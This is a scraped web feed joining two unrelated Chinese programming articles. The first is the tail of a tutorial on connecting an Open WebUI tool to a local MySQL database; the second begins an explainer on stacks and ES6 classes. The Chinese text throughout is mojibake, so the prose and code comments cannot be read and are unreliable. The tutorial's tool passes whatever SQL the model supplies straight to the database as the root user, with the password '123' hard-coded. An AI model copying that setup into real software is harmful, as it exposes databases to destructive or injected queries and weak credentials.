<li>å¤–éƒ¨å·¥å…·è°ƒç”¨Function Calling</li>
</ol>
<blockquote>
<p>æ¡ˆä¾‹ï¼šè¿æ¥æœ¬åœ°MySQLæ•°æ®åº“è¿›è¡Œæ•°æ®æŸ¥è¯¢</p>
</blockquote>
<p>4.1. å®‰è£…mysql</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åˆ›å»ºmysqlæ•°æ®åº“</span>
apt install mysql<span class="hljs-operator">-</span>server


<span class="hljs-comment">-- å¯åŠ¨mysql</span>
mysqld <span class="hljs-operator">&amp;</span>
mysql

<span class="hljs-comment">-- åˆå§‹åŒ–å¯†ç </span>
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">'root'</span>@<span class="hljs-string">'localhost'</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">'123'</span>;

<span class="hljs-comment">-- é€€å‡º</span>
exitï¼›

<span class="hljs-comment">-- å†æ¬¡è¿›å…¥</span>
mysql <span class="hljs-operator">-</span>u root <span class="hljs-operator">-</span>p

<span class="hljs-comment">-- åˆ›å»ºæ•°æ®åº“</span>
<span class="hljs-keyword">CREATE</span> DATABASE school;
USE school;

<span class="hljs-comment">-- åˆ›å»ºè¡¨ç»“æ„</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> students_scores (
id <span class="hljs-type">INT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY</span> KEY,
name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>),
course1 <span class="hljs-type">INT</span>,
course2 <span class="hljs-type">INT</span>,
course3 <span class="hljs-type">INT</span>
);

<span class="hljs-comment">-- æ’å…¥æ•°æ®</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> students_scores (name, course1, course2, course3)
<span class="hljs-keyword">VALUES</span>
(<span class="hljs-string">'å­¦ç”Ÿ1'</span>, <span class="hljs-number">85</span>, <span class="hljs-number">92</span>, <span class="hljs-number">78</span>),
(<span class="hljs-string">'å­¦ç”Ÿ2'</span>, <span class="hljs-number">76</span>, <span class="hljs-number">88</span>, <span class="hljs-number">91</span>),
(<span class="hljs-string">'å­¦ç”Ÿ3'</span>, <span class="hljs-number">90</span>, <span class="hljs-number">85</span>, <span class="hljs-number">80</span>),
(<span class="hljs-string">'å­¦ç”Ÿ4'</span>, <span class="hljs-number">65</span>, <span class="hljs-number">70</span>, <span class="hljs-number">72</span>),
(<span class="hljs-string">'å­¦ç”Ÿ5'</span>, <span class="hljs-number">82</span>, <span class="hljs-number">89</span>, <span class="hljs-number">95</span>),
(<span class="hljs-string">'å­¦ç”Ÿ6'</span>, <span class="hljs-number">91</span>, <span class="hljs-number">93</span>, <span class="hljs-number">87</span>),
(<span class="hljs-string">'å­¦ç”Ÿ7'</span>, <span class="hljs-number">77</span>, <span class="hljs-number">78</span>, <span class="hljs-number">85</span>),
(<span class="hljs-string">'å­¦ç”Ÿ8'</span>, <span class="hljs-number">88</span>, <span class="hljs-number">92</span>, <span class="hljs-number">91</span>),
(<span class="hljs-string">'å­¦ç”Ÿ9'</span>, <span class="hljs-number">84</span>, <span class="hljs-number">76</span>, <span class="hljs-number">80</span>),
(<span class="hljs-string">'å­¦ç”Ÿ10'</span>, <span class="hljs-number">89</span>, <span class="hljs-number">90</span>, <span class="hljs-number">92</span>);

<span class="hljs-comment">-- éœ€è¦åˆ·æ–°èº«ä»½éªŒè¯ï¼Œä½¿å¾—å…¶ä»–åº“ï¼ˆå¦‚pymysqlï¼‰å¯ä»¥é€šè¿‡å¯†ç éªŒè¯ç™»å½•ï¼š</span>
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">'root'</span>@<span class="hljs-string">'localhost'</span> IDENTIFIED <span class="hljs-keyword">WITH</span> mysql_native_password <span class="hljs-keyword">BY</span> <span class="hljs-string">'123'</span>;

</code></pre>
<p>4.2. ç¼–å†™å¤–éƒ¨å·¥å…·</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a73a5ccbf0a4261adbfccd56e1bbdb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMTZfb25l:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764828972&amp;x-signature=DlqmG1q2Sg%2FEf1t3u%2F4va05Ntr8%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> pymysql
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> Request
<span class="hljs-keyword">from</span> open_webui.models.users <span class="hljs-keyword">import</span> Users


<span class="hljs-keyword">class</span> <span class="hljs-title class_">Tools</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">pass</span>

    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">sql_inter</span>(<span class="hljs-params">
        self,
        sql_query: <span class="hljs-built_in">str</span>,
        __request__: Request,
        __user__: <span class="hljs-built_in">dict</span>,
        __event_emitter__=<span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-built_in">str</span>:
        <span class="hljs-string">"""
        ç”¨äºè·å–schoolæ•°æ®åº“ä¸­å„å¼ è¡¨çš„æœ‰å…³ç›¸å…³ä¿¡æ¯ã€‚

        :param sql_query: å­—ç¬¦ä¸²å½¢å¼çš„SQLæŸ¥è¯¢è¯­å¥ï¼Œç”¨äºæ‰§è¡Œå¯¹MySQLæ•°æ®åº“ä¸­çš„æŸ¥è¯¢
        :param __request__: HTTP è¯·æ±‚å¯¹è±¡ï¼ˆæ¥è‡ª FastAPIï¼‰
        :param __user__: ç”¨æˆ·ä¿¡æ¯ï¼ˆå¯ä»¥ç”¨äºä¸ªæ€§åŒ–æˆ–è®°å½•è¯·æ±‚ï¼‰
        :param __event_emitter__: äº‹ä»¶å‘å°„å™¨ï¼Œç”¨äºå°†å®æ—¶çŠ¶æ€æ›´æ–°å‘é€åˆ°å‰ç«¯
        :return: SQL æŸ¥è¯¢ç»“æœçš„ JSON å­—ç¬¦ä¸²
        """</span>
        <span class="hljs-comment"># Step 1. é€šçŸ¥ç”¨æˆ·æ­£åœ¨æ‰§è¡Œæ•°æ®åº“æŸ¥è¯¢</span>
        <span class="hljs-keyword">await</span> __event_emitter__(
            {
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"status"</span>,
                <span class="hljs-string">"data"</span>: {<span class="hljs-string">"description"</span>: <span class="hljs-string">"æ­£åœ¨æŸ¥è¯¢æ•°æ®åº“..."</span>, <span class="hljs-string">"done"</span>: <span class="hljs-literal">False</span>},
            }
        )

        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># Step 2. è¿æ¥ MySQL æ•°æ®åº“</span>
            connection = pymysql.connect(
                host=<span class="hljs-string">"localhost"</span>,  <span class="hljs-comment"># æ•°æ®åº“åœ°å€</span>
                user=<span class="hljs-string">"root"</span>,  <span class="hljs-comment"># æ•°æ®åº“ç”¨æˆ·å</span>
                passwd=<span class="hljs-string">"123"</span>,  <span class="hljs-comment"># æ•°æ®åº“å¯†ç </span>
                db=<span class="hljs-string">"school"</span>,  <span class="hljs-comment"># æ•°æ®åº“å</span>
                charset=<span class="hljs-string">"utf8"</span>,  <span class="hljs-comment"># å­—ç¬¦é›†é€‰æ‹©utf8</span>
            )

            <span class="hljs-comment"># Step 3. æ‰§è¡Œ SQL æŸ¥è¯¢</span>
            <span class="hljs-keyword">with</span> connection.cursor() <span class="hljs-keyword">as</span> cursor:
                cursor.execute(sql_query)
                results = cursor.fetchall()

            <span class="hljs-comment"># Step 4. æ ¼å¼åŒ–æŸ¥è¯¢ç»“æœ</span>
            results_json = json.dumps(results, ensure_ascii=<span class="hljs-literal">False</span>)

            <span class="hljs-comment"># Step 5. é€šçŸ¥ç”¨æˆ·æŸ¥è¯¢å®Œæˆ</span>
            <span class="hljs-keyword">await</span> __event_emitter__(
                {
                    <span class="hljs-string">"type"</span>: <span class="hljs-string">"status"</span>,
                    <span class="hljs-string">"data"</span>: {<span class="hljs-string">"description"</span>: <span class="hljs-string">"æ•°æ®åº“æŸ¥è¯¢å®Œæˆ"</span>, <span class="hljs-string">"done"</span>: <span class="hljs-literal">True</span>},
                }
            )

            <span class="hljs-comment"># Step 6. è¿”å›æŸ¥è¯¢ç»“æœ</span>
            <span class="hljs-keyword">return</span> <span class="hljs-string">f"æŸ¥è¯¢ç»“æœ: <span class="hljs-subst">{results_json}</span>"</span>

        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-comment"># Step 7. å¦‚æœå‘ç”Ÿé”™è¯¯ï¼Œé€šçŸ¥ç”¨æˆ·</span>
            <span class="hljs-keyword">await</span> __event_emitter__(
                {
                    <span class="hljs-string">"type"</span>: <span class="hljs-string">"status"</span>,
                    <span class="hljs-string">"data"</span>: {<span class="hljs-string">"description"</span>: <span class="hljs-string">f"å‘ç”Ÿé”™è¯¯: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>, <span class="hljs-string">"done"</span>: <span class="hljs-literal">True</span>},
                }
            )
            <span class="hljs-comment"># è¿”å›é”™è¯¯ä¿¡æ¯</span>
            <span class="hljs-keyword">return</span> <span class="hljs-string">f"è·å–æ•°æ®åº“æŸ¥è¯¢æ•°æ®æ—¶å‘ç”Ÿé”™è¯¯ï¼š<span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>

        <span class="hljs-keyword">finally</span>:
            <span class="hljs-comment"># Step 8. å…³é—­æ•°æ®åº“è¿æ¥</span>
            <span class="hljs-keyword">if</span> connection:
                connection.close()

</code></pre>
<p>4.3. å¯¹è¯ä¸­æ‰“å¼€æ•°æ®åº“æŸ¥è¯¢å·¥å…·</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f9592cfd91e4aa5bf7118018b1baa58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMTZfb25l:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764828972&amp;x-signature=KNyyCFN9f60OBErTMbbkmNZgAJo%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e44b657d22fa4b00a0057e5632562dda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMTZfb25l:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764828972&amp;x-signature=GLIHvgw5vMyCwZx%2Bc8kLx4gSLLc%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ§± æ·±å…¥ç†è§£æ ˆï¼ˆStackï¼‰ï¼šåŸç†ã€å®ç°ä¸å®æˆ˜åº”ç”¨]]></title>    <link>https://juejin.cn/post/7577201863750860840</link>    <guid>https://juejin.cn/post/7577201863750860840</guid>    <pubDate>2025-11-27T06:37:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577201863750860840" data-draft-id="7577049352837890063" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" ğŸ§± æ·±å…¥ç†è§£æ ˆï¼ˆStackï¼‰ï¼šåŸç†ã€å®ç°ä¸å®æˆ˜åº”ç”¨"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,é¢è¯•"/> <meta itemprop="datePublished" content="2025-11-27T06:37:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¥ç§˜çš„çŒªå¤´"/> <meta itemprop="url" content="https://juejin.cn/user/793223472877051"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             ğŸ§± æ·±å…¥ç†è§£æ ˆï¼ˆStackï¼‰ï¼šåŸç†ã€å®ç°ä¸å®æˆ˜åº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/793223472877051/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¥ç§˜çš„çŒªå¤´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:37:06.000Z" title="Thu Nov 27 2025 06:37:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€ä»€ä¹ˆæ˜¯æ ˆï¼ŸğŸ¤”</h2>
<p><strong>æ ˆ</strong>ï¼ˆStackï¼‰æ˜¯ä¸€ç§ç»å…¸çš„<strong>çº¿æ€§æ•°æ®ç»“æ„</strong>ï¼Œå…¶æ ¸å¿ƒç‰¹æ€§æ˜¯ <strong>â€œå…ˆè¿›åå‡ºâ€</strong> ï¼ˆLast In First Out, LIFOï¼‰ã€‚<br/>
ä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆä¸€æ‘ç›˜å­ğŸ½ï¸ï¼šæ¯æ¬¡åªèƒ½ä»é¡¶éƒ¨æ”¾å…¥æˆ–å–å‡ºç›˜å­ï¼Œæœ€æ™šæ”¾è¿›å»çš„ç›˜å­æœ€å…ˆè¢«æ‹¿å‡ºæ¥ã€‚</p>
<p>åœ¨è®¡ç®—æœºç§‘å­¦ä¸­ï¼Œæ ˆå¹¿æ³›åº”ç”¨äºä»¥ä¸‹åœºæ™¯ï¼š</p>
<ul>
<li>ğŸ” å‡½æ•°è°ƒç”¨ï¼ˆè°ƒç”¨æ ˆï¼‰</li>
<li>ğŸ§® è¡¨è¾¾å¼æ±‚å€¼ä¸è½¬æ¢ï¼ˆå¦‚ä¸­ç¼€è½¬åç¼€ï¼‰</li>
<li>âœ… æ‹¬å·åŒ¹é…éªŒè¯</li>
<li>ğŸ–¥ï¸ æµè§ˆå™¨å‰è¿›/åé€€å†å²</li>
<li>ğŸ”„ æ’¤é”€ï¼ˆUndoï¼‰æ“ä½œ</li>
</ul>
<blockquote>
<p>ğŸ’¡ æ ˆçš„æ ¸å¿ƒæ€æƒ³ï¼š<strong>åªæ“ä½œä¸€ç«¯ï¼ˆæ ˆé¡¶ï¼‰ï¼Œå¦ä¸€ç«¯å°é—­</strong>ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">äºŒã€æ ˆçš„æŠ½è±¡æ•°æ®ç±»å‹ï¼ˆADTï¼‰ğŸ§©</h2>
<p>ä¸€ä¸ªæ ‡å‡†çš„æ ˆåº”å…·å¤‡ä»¥ä¸‹<strong>å±æ€§å’Œæ–¹æ³•</strong>ï¼š</p>

































<table><thead><tr><th>æ–¹æ³• / å±æ€§</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>push(item)</code></td><td>â• å…¥æ ˆï¼šå°†å…ƒç´ å‹å…¥æ ˆé¡¶</td></tr><tr><td><code>pop()</code></td><td>â– å‡ºæ ˆï¼šç§»é™¤å¹¶è¿”å›æ ˆé¡¶å…ƒç´ </td></tr><tr><td><code>peek()</code> / <code>top()</code></td><td>ğŸ‘€ æŸ¥çœ‹æ ˆé¡¶å…ƒç´ ä½†ä¸ç§»é™¤</td></tr><tr><td><code>isEmpty()</code></td><td>â“ åˆ¤æ–­æ ˆæ˜¯å¦ä¸ºç©º</td></tr><tr><td><code>size</code></td><td>ğŸ”¢ è·å–æ ˆä¸­å…ƒç´ æ•°é‡</td></tr><tr><td><code>toArray()</code>ï¼ˆå¯é€‰ï¼‰</td><td>ğŸ“¤ å°†æ ˆå†…å®¹è½¬ä¸ºæ•°ç»„ï¼ˆç”¨äºè°ƒè¯•æˆ–å±•ç¤ºï¼‰</td></tr></tbody></table>
<blockquote>
<p>âš ï¸ <strong>æ³¨æ„</strong>ï¼šæ ˆä¸å…è®¸éšæœºè®¿é—®ä¸­é—´å…ƒç´ ï¼Œ<strong>åªèƒ½æ“ä½œæ ˆé¡¶</strong>ï¼</p>
</blockquote>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€ES6 Class ä¸æ ˆçš„å°è£… ğŸ› ï¸</h2>
<p>ES6 å¼•å…¥äº† <code>class</code> è¯­æ³•ï¼Œä½¿é¢å‘å¯¹è±¡ç¼–ç¨‹æ›´æ¸…æ™°ã€‚ç»“åˆç§æœ‰å­—æ®µï¼ˆ<code>#</code>ï¼‰ã€<code>get/set</code> è®¿é—®å™¨ç­‰æ–°ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥ä¼˜é›…åœ°å®ç°æ ˆã€‚</p>
<p>ä¸‹é¢æ·±å…¥è§£æè¿™äº›å…³é”®ç‰¹æ€§ğŸ‘‡ï¼š</p>
<hr/>
<h3 data-id="heading-3">1ï¸âƒ£ <code>class</code>ï¼šå®šä¹‰ç±»çš„æ¨¡æ¿ ğŸ“</h3>
<p>åœ¨ ES6 ä¹‹å‰ï¼ŒJavaScript é€šè¿‡<strong>æ„é€ å‡½æ•° + åŸå‹é“¾</strong>æ¨¡æ‹Ÿç±»ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ğŸ•°ï¸ ES5 é£æ ¼</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}
<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Hello, '</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
};
</code></pre>
<p>ES6 çš„ <code>class</code> æ˜¯å¯¹ä¸Šè¿°æ¨¡å¼çš„<strong>è¯­æ³•ç³–</strong>ï¼Œä½†ç»“æ„æ›´æ¸…æ™°ã€æ›´æ¥è¿‘ä¼ ç»Ÿ OOPï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// âœ¨ ES6 class</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Hello, '</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
  }
}
</code></pre>
<p>âœ… <strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ul>
<li>åº•å±‚ä»åŸºäº <strong>åŸå‹</strong>ï¼ˆprototypeï¼‰</li>
<li>æä¾›<strong>å£°æ˜å¼ã€ç»“æ„åŒ–</strong>çš„ä»£ç ç»„ç»‡æ–¹å¼</li>
<li>æ˜¾è‘—æå‡<strong>å¯è¯»æ€§ä¸å¯ç»´æŠ¤æ€§</strong>ï¼Œå°¤å…¶é€‚åˆå¤§å‹é¡¹ç›®</li>
</ul>
<hr/>
<h3 data-id="heading-4">2ï¸âƒ£ <code>#privateField</code>ï¼šç§æœ‰å±æ€§ ğŸ”’</h3>
<p>ä¼ ç»Ÿ JS ä¸­æ‰€æœ‰å±æ€§éƒ½æ˜¯å…¬å¼€çš„ï¼Œå®¹æ˜“è¢«å¤–éƒ¨ç¯¡æ”¹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">class Counter {
  constructor() {
    <span class="hljs-attr">this.count</span> = <span class="hljs-number">0</span><span class="hljs-comment">; // ğŸ˜± å¤–éƒ¨å¯éšæ„ä¿®æ”¹ï¼</span>
  }
}
const <span class="hljs-attr">c</span> = new Counter()<span class="hljs-comment">;</span>
<span class="hljs-attr">c.count</span> = <span class="hljs-number">999</span><span class="hljs-comment">; // ç ´åå°è£…ï¼</span>
</code></pre>
<p>ES2022 å¼•å…¥ <strong>ç§æœ‰å­—æ®µ</strong>ï¼ˆä»¥ <code>#</code> å¼€å¤´ï¼‰ï¼Œä»…é™ç±»å†…éƒ¨è®¿é—®ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
  #count = <span class="hljs-number">0</span>; <span class="hljs-comment">// ğŸ”’ ç§æœ‰å±æ€§</span>

  <span class="hljs-title function_">increment</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">this</span>.#count++; }
  <span class="hljs-title function_">getCount</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.#count; } <span class="hljs-comment">// âœ… å®‰å…¨æš´éœ²</span>
}

<span class="hljs-keyword">const</span> c = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
c.<span class="hljs-title function_">increment</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c.<span class="hljs-title function_">getCount</span>()); <span class="hljs-comment">// 1</span>

<span class="hljs-comment">// c.#count; // âŒ SyntaxError!</span>
</code></pre>
<p>âœ… <strong>ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li><strong>å°è£…æ€§</strong>ï¼šéšè—å®ç°ç»†èŠ‚</li>
<li><strong>å®‰å…¨æ€§</strong>ï¼šé˜²æ­¢å¤–éƒ¨è¯¯æ“ä½œ</li>
<li><strong>å¯ç»´æŠ¤æ€§</strong>ï¼šå†…éƒ¨é€»è¾‘å˜æ›´ä¸å½±å“å¤–éƒ¨è°ƒç”¨</li>
</ul>
<blockquote>
<p>âš ï¸ ç§æœ‰å­—æ®µå¿…é¡»<strong>æ˜¾å¼å£°æ˜</strong>ï¼Œä¸èƒ½åŠ¨æ€æ·»åŠ ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-5">3ï¸âƒ£ <code>constructor()</code>ï¼šåˆå§‹åŒ–å®ä¾‹ ğŸ§¬</h3>
<p><code>constructor</code> æ˜¯ç±»çš„æ„é€ å‡½æ•°ï¼Œåœ¨ <code>new</code> å®ä¾‹æ—¶è‡ªåŠ¨è°ƒç”¨ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Stack</span> {
  #items;
  <span class="hljs-keyword">constructor</span>(initialItems = []) {
    <span class="hljs-keyword">this</span>.#items = [...initialItems]; <span class="hljs-comment">// åˆå§‹åŒ–ç§æœ‰æ•°ç»„</span>
  }
}
</code></pre>
<p>âœ… <strong>ä½œç”¨</strong>ï¼š</p>
<ul>
<li>åˆå§‹åŒ–å®ä¾‹å±æ€§ï¼ˆåŒ…æ‹¬ç§æœ‰å±æ€§ï¼‰</li>
<li>æ¥æ”¶å‚æ•°è®¾ç½®åˆå§‹çŠ¶æ€</li>
<li>è‹¥æœªå®šä¹‰ï¼ŒJS ä¼šæä¾›ç©ºé»˜è®¤æ„é€ å‡½æ•°</li>
</ul>
<p>ğŸ” <strong>æ³¨æ„</strong>ï¼šæ¯ä¸ªç±»<strong>æœ€å¤šåªèƒ½æœ‰ä¸€ä¸ª</strong> <code>constructor</code>ã€‚</p>
<hr/>
<h3 data-id="heading-6">4ï¸âƒ£ <code>get size()</code>ï¼šåªè¯»å±æ€§è®¿é—®å™¨ ğŸ“</h3>
